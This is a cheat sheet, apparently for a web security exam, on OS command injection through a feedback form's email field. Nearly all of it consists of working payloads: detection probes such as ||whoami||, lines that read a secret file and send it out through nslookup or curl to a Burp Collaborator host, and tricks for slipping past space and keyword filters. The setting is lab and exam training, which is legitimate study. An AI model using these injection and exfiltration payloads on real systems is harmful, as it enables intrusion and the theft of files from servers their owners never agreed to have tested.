## 🎯 Target Location

**Primary Target:** Submit Feedback page - Email input field ⭐⭐⭐

## ⚠️ CRITICAL WARNING

**DO NOT rely only on this payload:**
```bash
email=||curl+burp.oastify.com?c=`whoami`||
```

**This works in labs but often FAILS on the exam!**

## 🔥 Recommended Approach: DNS Exfiltration

### Why DNS Exfiltration?
- Works even with only DNS callbacks (no HTTP)
- Bypasses output restrictions
- Reliable on exam

### DNS Exfiltration Payload
```bash
nslookup -q=cname $(cat /home/carlos/secret).burp.oastify.com
```

**How it works:**
1. `cat /home/carlos/secret` reads the file
2. `$(...)` captures output as subdomain
3. `nslookup` makes DNS query
4. Secret appears in Burp Collaborator DNS logs

## 📋 Command Injection Payloads

### Basic Detection
```bash
||whoami||
|whoami|
;whoami;
`whoami`
$(whoami)
```

### File Read (DNS Exfiltration)
```bash
||nslookup -q=cname $(cat /home/carlos/secret).burp.oastify.com||
||nslookup `cat /home/carlos/secret`.burp.oastify.com||
```

### File Read (HTTP Exfiltration)
```bash
||curl burp.oastify.com?c=$(cat /home/carlos/secret)||
```

## 🛡️ Bypass Techniques

### Space Bypass
```bash
cat${IFS}/home/carlos/secret
cat%09/home/carlos/secret
cat$IFS$9/home/carlos/secret
```

### Keyword Filtering Bypass
```bash
c''at /home/carlos/secret
c\at /home/carlos/secret
```

## 🎓 Exam Tips

1. **Use DNS exfiltration** - `nslookup $(cat /home/carlos/secret).burp.oastify.com`
2. **Test feedback form email field** - Most common location
3. **Try all input fields** - Name, email, subject, message
4. **Use Burp Collaborator** - Essential for out-of-band detection
5. **Be patient** - DNS callbacks may take a few seconds

---
